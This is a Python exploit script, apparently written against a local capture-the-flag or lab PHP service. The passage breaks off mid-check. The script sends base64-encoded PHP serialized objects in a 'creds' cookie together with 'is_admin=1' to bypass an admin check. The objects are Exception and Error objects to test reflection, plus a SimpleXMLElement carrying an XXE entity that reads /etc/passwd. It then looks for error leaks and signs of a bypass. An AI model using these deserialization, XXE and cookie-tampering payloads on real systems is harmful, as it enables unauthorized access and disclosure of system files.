import requests
import base64
import re

base_url = "http://127.0.0.1:32921/"

# If the code does something like echo "User: " . $data['username']
# And $data['username'] is an object with __toString, it would trigger

print("[*] Testing objects with __toString in data fields...\n")

# Inject an object with __toString into a field
# If the code does echo $data['username'], and username is an Exception object,
# it would call __toString and maybe reveal info

# Try putting Exception in username field
payloads = [
    # Exception in username field
    ('Exception_username', 'a:2:{s:8:"username";O:9:"Exception":1:{s:7:"message";s:14:"INJECTED_VALUE";}s:8:"password";s:5:"admin";}'),
    
    # Error in username field
    ('Error_username', 'a:2:{s:8:"username";O:5:"Error":1:{s:7:"message";s:14:"INJECTED_VALUE";}s:8:"password";s:5:"admin";}'),
    
    # Try with proper protected property format
    ('Exception_protected', 'a:2:{s:8:"username";O:9:"Exception":7:{s:17:"\x00*\x00message";s:14:"INJECTED_VALUE";s:7:"\x00*\x00string";s:0:"";s:7:"\x00*\x00code";i:0;s:7:"\x00*\x00file";s:0:"";s:7:"\x00*\x00line";i:0;s:16:"\x00Exception\x00trace";a:0:{}s:20:"\x00Exception\x00previous";N;}s:8:"password";s:5:"admin";}'),
    
    # SimpleXMLElement for XXE
    ('SimpleXMLElement', 'a:2:{s:8:"username";O:16:"SimpleXMLElement":1:{s:3:"xml";s:100:"<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>";}s:8:"password";s:5:"admin";}'),
]

for name, payload in payloads:
    print(f"[*] Testing {name}...")
    
    payload_b64 = base64.b64encode(payload.encode()).decode()
    headers = {'Cookie': f'creds={payload_b64}; is_admin=1'}
    
    try:
        resp = requests.get(base_url, headers=headers, timeout=10)
        
        has_error = "Fatal error" in resp.text or "Warning" in resp.text
        has_rejection = "you are not the admin" in resp.text
        
        print(f"    Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if has_error:
            err_match = re.search(r'(<b>Fatal error</b>.*?<br />|<b>Warning</b>.*?<br />)', resp.text, re.DOTALL)
            if err_match:
                print(f"    Error: {err_match.group(1)[:150]}")
        
        print(f"    {'[REJECTED]' if has_rejection else '[BYPASSED]'}")
        
        # Check if INJECTED_VALUE appears in response (would indicate __toString was called)
        if "INJECTED_VALUE" in resp.text:
